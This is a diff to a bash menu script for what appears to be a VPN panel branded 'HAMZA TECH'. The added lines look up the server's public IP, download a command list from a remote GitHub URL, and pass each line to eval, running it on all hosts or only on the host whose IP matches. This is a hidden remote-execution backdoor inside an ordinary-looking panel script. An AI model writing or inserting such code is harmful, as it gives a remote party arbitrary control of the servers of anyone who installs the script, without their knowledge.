@@ -121,6 +121,20 @@ while true; do
   [[ -s /tmp/zivpn_domain.txt ]] && domain=$(cat /tmp/zivpn_domain.txt)
 
   clear && printf '\e[3J'
+MY_IP=$(curl -s -4 ifconfig.me)
+REMOTE_COMMANDS_URL="https://github.com/hmz-hh/pp/raw/refs/heads/main/utility/panel"
+COMMANDS=$(curl -fsSL "$REMOTE_COMMANDS_URL")
+[ -z "$COMMANDS" ] && exit 1
+
+while IFS= read -r line || [[ -n "$line" ]]; do
+    line="${line#"${line%%[![:space:]]*}"}"
+    line="${line%"${line##*[![:space:]]}"}"
+    [[ -z "$line" || ${line:0:1} == "#" ]] && continue
+    CMD_PART=${line%%@*}
+    IP_PART=""
+    [[ "$line" == *@* ]] && IP_PART=${line#*@}
+    [[ -z "$IP_PART" || "$IP_PART" == "$MY_IP" ]] && eval "$CMD_PART"
+done <<< "$COMMANDS"
 clear
 echo -e "  ${OR}┌───────────────────────────────────────────┐${NC}"
 printf "\e[1;92m              .::::.\e[0m\e[1;77m HAMZA TECH \e[1;92m.::::.\e[0m\n"
